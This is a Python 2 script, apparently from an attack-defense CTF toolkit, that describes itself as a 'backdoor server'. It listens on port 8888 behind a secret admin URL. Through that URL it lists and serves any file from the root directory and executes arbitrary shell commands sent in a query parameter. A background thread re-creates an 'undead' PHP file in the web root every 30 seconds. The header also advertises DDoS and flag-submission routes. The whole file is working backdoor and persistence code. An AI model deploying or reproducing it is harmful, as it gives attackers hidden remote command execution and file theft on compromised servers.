#!/usr/bin/env python2

'''

@name backdoor server
@author haozigege@Lancet
@version v0.0
@time 2018.9

This tool is utilized as a service to store the flag in queue, and then to send them 
at a certain speed.

Here are the routes:
/$hash:   to download file
/$hash/ddos: to start the ddos attack against some server
/$hash/shell: to get the report of the shell scan(including the malicious )
/$hash/cmd: to execute the cmd sent by the client
/$hash/state: to get the resource state of some target
/$hash/waf: to get the report of the waf

active processes:
1. get flag and submit (u should ensure the server could connect to the flag server)
2. check the webshell and generate it if not exists


'''

import os
import socket
import sys
import SimpleHTTPServer
import SocketServer
import cgi
import re
from time import gmtime, strftime
import threading 
import Queue
from urlparse import parse_qs,urlparse
import time
import subprocess
import signal
import base64

reload(sys)  
sys.setdefaultencoding('utf8')



###### configuration #######

# the listen port
listen_port = 8888

# remote flag submit	
remote_flag_url = 'https://172.16.4.1/Common/awd_sub_answer'

# team token
token = '3b72366f3d32af726342e3242e6bcfe8'

# team cookie
team_cookie = {"phpsessid":"haozigege"}

# flag submit span
flag_span = 100

# request timeout 
time_out = 4

# admin router for file manager
admin_router = '/3aae0208b6deb94be6bb0a6b153187f4'

# file manager base
dir_base = '/'

# shell scan log
shell_log_file = './.shell_log'

# shell scan path
scan_path = '/var/www/html'


# routers
routers = ['/dos','/shell','/cmd','/state']

# undead shell path
shell_path = '/var/www/html/.1.php'

# undead shell content
shell_content = "<?php phpinfo();?>\r"
shell_content =  shell_content + ' ' * len(shell_content) + "\n"

############################



######### global functions #############

def g_undead_shell():
	'''
		generate undead shell
	'''
	while True:
		open(shell_path,'w').write(shell_content)
		time.sleep(30)






########################################


class CustomHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

	def do_GET(self):
		self.my_main_handle()

	def do_POST(self):
		self.my_main_handle()

	def admin_handle(self):
		'''
		play with the http data 
	
		'''

		# some error might happen when u try to enter a folder without /
		if not self.path.startswith(admin_router + '/'):
			self.send_response(301)
			self.send_header('Location', admin_router + '/')
			self.end_headers()

		# normal file list
		real_path = dir_base + self.path[len(admin_router):]
		if not real_path:
			real_path = dir_base + '/'
		if os.path.isdir(real_path):
			f = self.list_directory(real_path)
			self.copyfile(f, self.wfile)
		elif os.path.exists(real_path):
			# I am sure it's a normal file
			f = open(real_path,'rb')
			self.send_response(200)
			self.send_header('Content-type', 'text/html')
			self.end_headers()
			self.copyfile(f, self.wfile)
		return 


	def error_handle(self,msg):
		self.send_response(404)
		self.send_header('Content-type', 'text/html')
		self.end_headers()
		self.wfile.write(msg)

	def success_handle(self,msg):
		self.send_response(200)
		self.send_header('Content-type', 'text/html')
		self.end_headers()
		self.wfile.write(msg)



	def cmd_handle(self,params):
		'''
			run the cmd send from the client
		'''

		if params.has_key('cmd'):
			cmd = params['cmd'][0]
			# cmd = cmd.split(" ")
			start = time.time()
			process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			while process.poll() is None:
				time.sleep(0.2)
				now = time.time()
				if (now - start) > time_out:
					os.kill(process.pid, signal.SIGKILL)
					os.waitpid(-1, os.WNOHANG)
					self.success_handle('process runtime exhausts')
					return 
			res = process.stdout.read()
			self.success_handle(res)

		else:
			self.success_handle('server alive')


	def state_handle(self,params):
		'''
			to get the state of the remote server
		
		'''

		cmd = '''#!/bin/bash
#get cpu number
cpu_no=`grep -c 'model name' /proc/cpuinfo`  

#get averge load in 15min
avg_load=`uptime | awk '{print $NF}'` 

#get current cpu occupy
idle=`top -b -n 1 | grep Cpu | awk -F ',' '{print $4}' | cut -f 1 -d "."`
cpu_load=$((100-$idle))

#get free memory
free_mem=$(free -m |grep - |awk -F : '{print $2}' |awk '{print $2}')

#get total memory:
all_mem=$(($(cat /proc/meminfo |grep 'MemTotal' |awk -F : '{print $2}' |sed 's/^[ \t]*//g'|cut -f 1 -d " ")/(1024)))


#get free disk
free_dk=$(($(df /| awk '/\//{print$4}')/(1024)))

#get total disk 
all_dk=$(($(df /| awk '/\//{print$2}')/(1024)))

#get the tcp listening ports 
tcp_ports=`netstat -an|grep LISTEN|egrep "0.0.0.0|:::"|awk '/^tcp/ {print $4}'|awk -F: '{print $2$4}' | sort -n| paste -d "," -s`

#get the udp listening ports
udp_ports=`netstat -an|grep udp|awk '{print $4}'|awk -F: '{print $2}'|sed '/^$/d'|sort -n | paste -d "," -s`

#print res
my_columns=("cpu_no" "avg_load" "cpu_load" "free_mem" "all_mem" "free_dk" "all_dk")
for column in ${my_columns[@]}
do
printf "|%-10s" $column
done

echo ""

my_results=($cpu_no $avg_load $cpu_load $free_mem $all_mem $free_dk $all_dk)
for result in ${my_results[@]}
do
printf "|%-10s" $result
done

echo ""

printf "tcp_listen: %s\n" $tcp_ports
printf "udp_listen: %s\n" $udp_ports'''

		cmd = base64.b64encode(cmd)
	
		# the popen originally use sh, but we need bash here
		res = os.popen('echo %s |base64 -d|/bin/bash' %cmd).read()
		self.success_handle(res)
		return


	def shell_handle(self,params):
		'''
			return the results created by shell scan

		'''

		if os.path.exists(shell_log_file):
			self.success_handle(open(shell_log_file).read())
		else:
			self.error_handle('error: ' + shell_log_file + ' does not exist')
		

		








	def my_main_handle(self):
		'''
		handle with the payload
		'''

		# with that admin url prefix, we can be authorized with admin priv
		if self.path.startswith(admin_router):

			# substract the route from the url
			path = urlparse(self.path).path

			# the urlparse uses the ';' as separator, so encode it
			params = parse_qs(urlparse(self.path).query.replace(';','%3b'))

			my_route = path[len(admin_router):]


			if my_route in routers and hasattr(self,my_route[1:] + '_handle'):
				my_handle = getattr(self,my_route[1:] + '_handle')
				my_handle(params)
				return

			else:
				self.admin_handle()
				return

		# 404 not found
		self.error_handle('404 not found')


# update the server_bind function to reuse the port 
class MyTCPServer(SocketServer.TCPServer):
	def server_bind(self):
		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.socket.bind(self.server_address)


t = threading.Thread(target=g_undead_shell,name='g_undead_shell')
t.setDaemon(True)
t.start()



httpd = MyTCPServer(("", listen_port), CustomHTTPRequestHandler)
print "serving at port", listen_port
httpd.serve_forever()













